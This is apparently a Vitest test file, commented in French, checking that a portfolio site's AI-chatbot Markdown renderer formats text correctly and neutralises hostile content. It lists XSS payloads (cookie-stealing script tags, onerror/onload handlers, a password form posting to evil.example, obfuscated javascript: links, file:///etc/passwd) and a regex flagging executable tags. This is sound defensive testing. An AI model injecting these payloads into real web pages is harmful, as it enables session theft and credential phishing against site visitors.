// P7.2 — Réponses du Clone IA en Markdown : rendu lisible, aucune exécution possible.
// Rendu serveur (react-dom/server) : le HTML produit est exactement celui que React insère.
import { describe, it, expect } from 'vitest'
import fs from 'node:fs'
import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { MemoryRouter } from 'react-router-dom'
import ChatMarkdown from './ChatMarkdown'
import { MAX_RENDERED_CHARS, safeChatUrl } from './markdownRules'

const render = (content: string) =>
  renderToStaticMarkup(createElement(MemoryRouter, null, createElement(ChatMarkdown, { content })))

/**
 * Aucun élément ni attribut exécutable dans le HTML produit. Seules les vraies balises sont
 * examinées : le HTML écrit par l'IA apparaît échappé (&lt;…&gt;), comme du texte inerte.
 * Les seuls <svg> admis sont les icônes décoratives de l'interface (lucide, aria-hidden).
 */
function expectInert(html: string) {
  for (const tag of html.match(/<[a-z][^>]*>/gi) ?? []) {
    if (/^<svg\b/i.test(tag)) {
      expect(tag).toMatch(/class="lucide[ "]/)
      expect(tag).toMatch(/aria-hidden="true"/)
      continue
    }
    if (/^<(path|circle|rect|line|polyline|polygon)\b/i.test(tag)) continue // tracés des icônes lucide
    expect(tag).not.toMatch(/^<(script|iframe|object|embed|style|math|form|link|meta|base|img|video|audio|source|frame|textarea|select)\b/i)
    expect(tag).not.toMatch(/\son[a-z]+\s*=/i)
    expect(tag).not.toMatch(/(href|src|action|formaction|xlink:href)\s*=\s*"\s*(javascript|data|vbscript|file):/i)
    expect(tag).not.toMatch(/\sstyle="(?!text-align:(left|right|center)")/i)
  }
}

describe('mise en forme', () => {
  it('paragraphes, gras, italique, barré, retours à la ligne naturels', () => {
    const html = render('Bonjour **Adjoumani** et *bienvenue* ~~ancien~~\nligne suivante\n\nNouveau paragraphe')
    expect(html).toContain('<strong>Adjoumani</strong>')
    expect(html).toContain('<em>bienvenue</em>')
    expect(html).toContain('<del>ancien</del>')
    expect(html).toMatch(/ancien<\/del><br\/>\s*ligne suivante/)
    expect(html.match(/<p>/g)?.length).toBe(2)
    expect(html).not.toContain('**')
  })

  it('titres décalés sous le niveau de la page (h1 → h3…)', () => {
    const html = render('# Titre\n## Sous-titre\n### Détail\n#### Plus')
    expect(html).toContain('<h3 class="ai-md-h ai-md-h3">Titre</h3>')
    expect(html).toContain('<h4 class="ai-md-h ai-md-h4">Sous-titre</h4>')
    expect(html).toContain('<h5 class="ai-md-h ai-md-h5">Détail</h5>')
    expect(html).toContain('<h6 class="ai-md-h ai-md-h6">Plus</h6>')
    expect(html).not.toMatch(/<h[12]\b|###/)
  })

  it('listes à puces, numérotées et cases à cocher', () => {
    const html = render('- un\n- deux\n\n3. trois\n4. quatre\n\n- [x] fait\n- [ ] à faire')
    expect(html).toMatch(/<ul>\s*<li>un<\/li>/)
    expect(html).toMatch(/<ol start="3">/)
    expect(html).toMatch(/<input type="checkbox" disabled="" checked=""\/>/)
  })

  it('citations, séparateurs, code en ligne', () => {
    const html = render('> Une citation\n\n---\n\nUtilise `npm run build`.')
    expect(html).toMatch(/<blockquote>\s*<p>Une citation<\/p>\s*<\/blockquote>/)
    expect(html).toContain('<hr/>')
    expect(html).toContain('<code>npm run build</code>')
  })

  it('bloc de code : langage affiché, bouton Copier, contenu échappé, défilable au clavier', () => {
    const html = render('```tsx\nconst a = <div onClick={x}>"ok"</div>\n```')
    expect(html).toContain('<span class="ai-md-code-lang">tsx</span>')
    expect(html).toMatch(/<button type="button" class="ai-md-copy" aria-label="Copier le code">/)
    expect(html).toMatch(/<pre tabindex="0"><code class="language-tsx">const a = &lt;div onClick=\{x\}&gt;&quot;ok&quot;&lt;\/div&gt;/)
    expect(render('```\nsans langage\n```')).toContain('<span class="ai-md-code-lang">code</span>')
  })

  it('tableau dans une région défilable horizontalement, atteignable au clavier', () => {
    const html = render('| Projet | Stack |\n|:--|--:|\n| InkSpace | React |')
    expect(html).toMatch(/<div class="ai-md-table" role="region" aria-label="Tableau, défilable horizontalement" tabindex="0"><table>/)
    expect(html).toContain('<th style="text-align:left">Projet</th>')
    expect(html).toContain('<td style="text-align:right">React</td>')
  })

  it('liens externes en nouvel onglet sans transmission d’accès ; liens internes dans le site', () => {
    const html = render('[GitHub](https://github.com/Adjoum) · [Projets](/projects) · [Écrire](mailto:contact@adjoumani-koffi.com)')
    expect(html).toContain('<a href="https://github.com/Adjoum" target="_blank" rel="noopener noreferrer nofollow ugc">GitHub')
    expect(html).toContain('<a href="/projects" data-discover="true">Projets</a>')
    expect(html).toContain('<a href="mailto:contact@adjoumani-koffi.com">Écrire</a>')
    expect(html).toContain('(nouvel onglet)')
  })
})

describe('sécurité : contenu fourni par le fournisseur IA', () => {
  it('liens javascript:, data:, vbscript:, file: et variantes déguisées neutralisés', () => {
    const vectors = [
      'javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'java\tscript:alert(1)', ' javascript:alert(1)',
      '&#106;avascript:alert(1)', 'javascript&#58;alert(1)', 'data:text/html;base64,PHNjcmlwdD4=',
      'vbscript:msgbox(1)', 'file:///etc/passwd', '//evil.example/x', '/\\evil.example', 'jav&#x09;ascript:alert(1)',
    ]
    for (const v of vectors) {
      const html = render(`[clic](${v}) <${v}>`)
      expectInert(html)
      expect(html, v).not.toMatch(/href="(?!https?:\/\/|\/[^/\\]|mailto:)/)
      expect(html, v).not.toMatch(/href="https?:\/\/evil/)
    }
    expect(render('[clic](javascript:alert(1))')).toContain('<span class="ai-md-link-off">clic</span>')
  })

  it('balises HTML malveillantes affichées comme texte, jamais interprétées', () => {
    const payloads = [
      '<script>alert(document.cookie)</script>',
      '<img src=x onerror="alert(1)">',
      '<svg onload=alert(1)><circle/></svg>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<a href="javascript:alert(1)">piège</a>',
      '<div style="position:fixed;inset:0" onclick="steal()">Gagné !</div>',
      '<form action="https://evil.example"><input name="password"></form>',
      '<style>body{display:none}</style>',
      '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
      '<object data="x.swf"></object><embed src="x">',
      '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    ]
    for (const p of payloads) {
      const html = render(`Avant ${p} après\n\n${p}`)
      expectInert(html)
      expect(html).toContain('&lt;')
    }
  })

  it('code HTML fourni par l’IA : affiché dans un bloc de code, pas exécuté', () => {
    const html = render('Voici :\n\n```html\n<button onclick="alert(1)">OK</button>\n<script>fetch("/x")</script>\n```')
    expectInert(html)
    expect(html).toContain('&lt;button onclick=&quot;alert(1)&quot;&gt;OK&lt;/button&gt;')
  })

  it('images distantes jamais chargées (vie privée) : lien explicite à la place', () => {
    const html = render('![suivi](https://tracker.example/pixel.png) ![x](javascript:alert(1)) ![local](/a.png)')
    expectInert(html)
    expect(html).toContain('<a class="ai-md-img" href="https://tracker.example/pixel.png" target="_blank" rel="noopener noreferrer nofollow ugc">')
    expect(html).toContain('Image : suivi')
    expect(html).not.toMatch(/rel="preload"/)
  })

  it('Markdown malformé : rendu sans erreur', () => {
    for (const bad of ['```js\nnon fermé', '**gras non fermé', '| a | b |\n|---|\n| 1 |', '[lien](', '<<<>>>', '* * *\n- [ ', '\u0000​﻿', '# '.repeat(500)]) {
      expect(() => render(bad)).not.toThrow()
      expectInert(render(bad))
    }
  })

  it('grand tableau (200 lignes × 12 colonnes) et message très long : rendus, bornés', () => {
    const header = `| ${Array.from({ length: 12 }, (_, i) => `C${i}`).join(' | ')} |\n|${' --- |'.repeat(12)}\n`
    const rows = Array.from({ length: 200 }, (_, r) => `| ${Array.from({ length: 12 }, (_, c) => `v${r}-${c}`).join(' | ')} |`).join('\n')
    const table = render(header + rows)
    expect(table.match(/<tr>/g)?.length).toBe(201)

    const long = 'mot '.repeat(MAX_RENDERED_CHARS)
    const html = render(long)
    expect(html).toContain('Réponse tronquée à l’affichage')
    expect(html.length).toBeLessThan(MAX_RENDERED_CHARS * 1.2)
    expect(() => render('a'.repeat(50_000))).not.toThrow()
  })

  it('filtre d’adresses', () => {
    expect(safeChatUrl('https://example.com/a?b=1')).toBe('https://example.com/a?b=1')
    expect(safeChatUrl('/projects')).toBe('/projects')
    expect(safeChatUrl('mailto:a@b.c')).toBe('mailto:a@b.c')
    for (const bad of ['javascript:alert(1)', 'data:,x', '//evil.example', '/\\evil', 'relative/path', '#ancre', '', 'http:// espace', '/a b']) {
      expect(safeChatUrl(bad), bad).toBeNull()
    }
  })

  it('jamais de dangerouslySetInnerHTML ni de rehype-raw pour le Clone IA', () => {
    for (const file of ['src/components/AIAgent.tsx', 'src/components/chat/ChatMarkdown.tsx', 'src/components/chat/markdownRules.ts']) {
      // Commentaires exclus : ils expliquent justement pourquoi ces deux mécanismes sont proscrits
      const code = fs.readFileSync(file, 'utf8').split('\n').filter(l => !/^\s*(\/\/|\/\*|\*)/.test(l)).join('\n')
      expect(code, file).not.toMatch(/dangerouslySetInnerHTML|rehype-raw|rehypeRaw\b/)
    }
  })
})
